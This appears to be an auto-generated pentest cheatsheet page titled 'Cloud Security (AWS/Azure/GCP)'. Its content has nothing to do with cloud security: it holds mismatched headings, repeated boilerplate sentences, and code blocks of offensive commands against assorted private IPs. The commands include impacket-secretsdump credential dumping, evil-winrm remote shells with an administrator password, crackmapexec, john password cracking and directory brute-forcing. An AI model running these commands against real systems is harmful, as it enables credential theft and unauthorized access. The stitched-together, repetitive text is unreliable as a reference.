---
TitleSEO: "Cloud Security (AWS/Azure/GCP) | ZureFX"
TitlePost: "Cloud Security (AWS/Azure/GCP)"
Author: "ZureFX"
Description: "Personal notes on Cloud Security (AWS/Azure/GCP). Quick reference for pentesting and CTF challenges."
Keywords: "windows, cheatsheet, oscp, enumeration, dfir, privilege escalation"
URL: "https://zurefx.github.io/notes/note-cloud-security-(aws-azure-gcp)-637.html"
URL_IMAGES: ""
Date: "2025-01-08"
Tags: "Windows, Cheatsheet, OSCP, Enumeration, DFIR, Privilege Escalation"
Section: "notes"
Lang: "en"
main_img: "note-cloud-security-(aws-azure-gcp)-637"
Permalink: "/notes/note-cloud-security-(aws-azure-gcp)-637.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Drupal

### sqlmap

Group Policy Preferences contained encrypted but recoverable credentials. Authentication bypass was achieved through careful manipulation of the login mechanism. The kernel version was outdated and vulnerable to a publicly known exploit.

```python
impacket-secretsdump administrator:'P@ssw0rd!'@10.83.80.42
impacket-secretsdump administrator:'P@ssw0rd!'@10.128.78.254
feroxbuster -h
feroxbuster -h
```

Lateral movement was facilitated by reusing discovered credentials across services. Token impersonation allowed elevation to SYSTEM privileges on the target. Authentication bypass was achieved through careful manipulation of the login mechanism. Weak file permissions allowed modification of critical system files.

The application stored sensitive credentials in an unencrypted configuration file. The target system was identified as running a vulnerable version of the service. Weak file permissions allowed modification of critical system files. The target system was identified as running a vulnerable version of the service.

The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities. The application stored sensitive credentials in an unencrypted configuration file.

## HTTPS

### WordPress

> **Note:** Silver Ticket was identified as the primary attack vector in this scenario.

```python
evil-winrm -i 10.37.101.18 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.15.27.244/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.12.184.228
```

Privilege escalation was possible due to misconfigured sudo permissions. Unconstrained delegation was enabled on the compromised machine. Token impersonation allowed elevation to SYSTEM privileges on the target. Group Policy Preferences contained encrypted but recoverable credentials. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
crackmapexec smb 10.45.86.150 -u administrator -p 'P@ssw0rd!' --shares
```

## SMB

### WinRM

Weak file permissions allowed modification of critical system files. Lateral movement was facilitated by reusing discovered credentials across services. Weak file permissions allowed modification of critical system files. Post-exploitation enumeration revealed a path to domain administrator privileges. Token impersonation allowed elevation to SYSTEM privileges on the target.

> **Note:** NFS No Root Squash was identified as the primary attack vector in this scenario.

## smbexec

### Broken Access Control

The backup files contained sensitive information that should not have been accessible. Post-exploitation enumeration revealed a path to domain administrator privileges. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.11.67.51
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.74.66.93/FUZZ
```

Group Policy Preferences contained encrypted but recoverable credentials. Group Policy Preferences contained encrypted but recoverable credentials.

> **Note:** AS-REP Roasting was identified as the primary attack vector in this scenario.

## atexec

### Windows Server 2019

```powershell
feroxbuster -h
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.24.175.1
```

```powershell
gobuster dir -u http://10.127.172.240/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.112.181.221/FUZZ
evil-winrm -i 10.85.127.129 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.32.139.194 -u administrator -p 'P@ssw0rd!'
```

- `GetUserSPNs`
- `LAPS Abuse`
- `enum4linux`
